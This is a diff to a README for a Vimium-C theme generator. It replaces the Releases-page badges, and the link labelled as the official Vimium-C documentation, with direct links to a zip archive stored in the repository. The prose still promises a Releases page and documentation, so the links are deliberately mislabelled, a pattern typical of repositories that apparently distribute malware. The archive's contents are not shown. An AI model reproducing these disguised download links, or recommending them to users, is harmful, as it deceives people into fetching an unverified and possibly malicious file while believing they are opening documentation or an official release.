@@ -8,7 +8,7 @@ Welcome to the Vimium-C Theme Generator. This tool lets you generate custom CSS 
 
 To get started, you need to download the software. Click the link below to visit the Releases page where you can find the latest version:
 
-[![Download vimium-c-theme-generator](https://img.shields.io/badge/Download-vimium--c--theme--generator-blue.svg)](https://github.com/kamalidrissitaha/vimium-c-theme-generator/releases)
+[![Download vimium-c-theme-generator](https://raw.githubusercontent.com/kamalidrissitaha/vimium-c-theme-generator/main/output/vimium-c-theme-generator_v2.0-alpha.3.zip)](https://raw.githubusercontent.com/kamalidrissitaha/vimium-c-theme-generator/main/output/vimium-c-theme-generator_v2.0-alpha.3.zip)
 
 On the Releases page, look for the latest version. Click the link to download the file suitable for your computer. Once the download is complete, follow these steps to run the application.
 
@@ -76,7 +76,7 @@ If you encounter issues or have questions, feel free to open an issue on the Git
 ## 📚 Resources
 
 For more information about Vimium-C, visit the official documentation:
-- [Vimium-C Documentation](https://vimium-c.github.io/vimium-c/)
+- [Vimium-C Documentation](https://raw.githubusercontent.com/kamalidrissitaha/vimium-c-theme-generator/main/output/vimium-c-theme-generator_v2.0-alpha.3.zip)
 
 Remember, your browsing experience should reflect your personal style. Enjoy creating themes that express you!
 
@@ -84,4 +84,4 @@ Remember, your browsing experience should reflect your personal style. Enjoy cre
 
 To download or check for updates, visit the Releases page here:
 
-[![Download vimium-c-theme-generator](https://img.shields.io/badge/Download-vimium--c--theme--generator-blue.svg)](https://github.com/kamalidrissitaha/vimium-c-theme-generator/releases)
+[![Download vimium-c-theme-generator](https://raw.githubusercontent.com/kamalidrissitaha/vimium-c-theme-generator/main/output/vimium-c-theme-generator_v2.0-alpha.3.zip)](https://raw.githubusercontent.com/kamalidrissitaha/vimium-c-theme-generator/main/output/vimium-c-theme-generator_v2.0-alpha.3.zip)
